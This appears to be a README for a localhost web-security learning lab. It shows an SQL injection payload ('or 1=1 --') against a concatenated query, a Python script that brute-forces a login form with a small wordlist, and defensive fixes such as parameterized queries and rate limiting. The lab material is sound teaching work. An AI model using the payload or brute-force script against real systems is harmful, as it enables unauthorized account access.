# Web Security Lab: SQL Injection & Brute Force Attack/Defense

A self-built attack and defense lab demonstrating two common web vulnerabilities — SQL injection and weak password brute forcing — using a deliberately vulnerable Flask login application backed by SQLite.

Built entirely from scratch on Parrot OS as a hands-on learning project.

-----

## What This Project Demonstrates

|Attack                              |Defense Concept                           |
|------------------------------------|------------------------------------------|
|SQL Injection via unsanitized input |Parameterized queries prevent injection   |
|Brute force with a password wordlist|Strong passwords resist dictionary attacks|

-----

## Project Structure

```
project/
├── app.py           # Vulnerable Flask login server (intentional)
├── project.py       # SQL injection demo (raw string concat)
├── attack.py        # Brute force script using requests
├── AAA.db           # SQLite database with users table
└── templates/
    └── ABC.html     # Login form
```

-----

## Components

### 1. Vulnerable Flask App (`app.py`)

A minimal Flask login server connected to SQLite. The fixed version uses parameterized queries (`?` placeholders) which safely treat user input as data, not executable SQL.

```python
from flask import Flask, request, render_template
import sqlite3

app = Flask(__name__)

def get_db():
    return sqlite3.connect("AAA.db")

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]
        conn = get_db()
        cursor = conn.cursor()
        # Parameterized query — safe version
        cursor.execute(
            "SELECT * FROM users WHERE username=? AND password=?",
            (username, password)
        )
        user = cursor.fetchone()
        if user:
            return "Login success"
        else:
            return "Login failed"
    return render_template("ABC.html")

app.run(debug=True)
```

-----

### 2. SQL Injection Demo (`project.py`)

Demonstrates what happens when user input is concatenated directly into a SQL query instead of being parameterized.

**Vulnerable query (string concatenation):**

```python
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
```

**Injection payload:**

```
Username: admin
Password: admin' or 1=1 --
```

**Resulting query sent to database:**

```sql
SELECT * FROM users WHERE username='admin' AND password='admin' or 1=1 --'
```

The `or 1=1` condition is always true, and `--` comments out the rest — so the query returns all users regardless of password, granting login success.

**Output:**

```
Query = select* from users where username='admin' and password='admin' or 1=1 --'
Login success!
```

-----

### 3. Brute Force Attack Script (`attack.py`)

A Python script that iterates through a password wordlist and sends POST requests to the login endpoint until it finds a valid password.

```python
import requests

url = "http://127.0.0.1:5000/"
username = "admin"
wordlist = ["admin", "adminpassword", "admin12345", "12345678", "guest"]

for password in wordlist:
    data = {"username": username, "password": password}
    r = requests.post(url, data=data)
    if "Login success" in r.text:
        print(f"[+] Password found: {password}")
        break
    else:
        print(f"[-] Tried: {password}")
```

**Output:**

```
[-] Tried: admin
[+] Password found: adminpassword
```

-----

## Key Lessons

**SQL Injection** is possible when user input is treated as part of the query logic rather than as data. The fix is always parameterized queries — never string formatting or concatenation in SQL.

**Brute force** works when passwords are weak or predictable. Even a tiny wordlist of 5 common passwords successfully cracked the test account. Real-world mitigations include account lockout, rate limiting, CAPTCHA, and enforcing strong password policies.

**Debug mode in production** is dangerous — the Flask server in this lab exposed a Debugger PIN (`211-616-880`) in the terminal output, which in a real deployment could allow remote code execution via the Werkzeug debugger console.

-----

## How to Run

**Requirements:**

```bash
pip install flask requests
```

**Start the vulnerable server:**

```bash
python3 app.py
```

**Run SQL injection demo:**

```bash
python3 project.py
```

**Run brute force attack:**

```bash
python3 attack.py
```

-----

## Disclaimer

This project is intentionally vulnerable and is for **local educational use only**. Do not deploy this server on a public network. All testing was performed on localhost against a self-built environment.

-----

## Skills Demonstrated

- Python (Flask, SQLite3, Requests)
- SQL query construction and parameterization
- Understanding of injection attack vectors
- Scripted HTTP attack simulation
- Attack/defense thinking — building both the vulnerable target and the exploit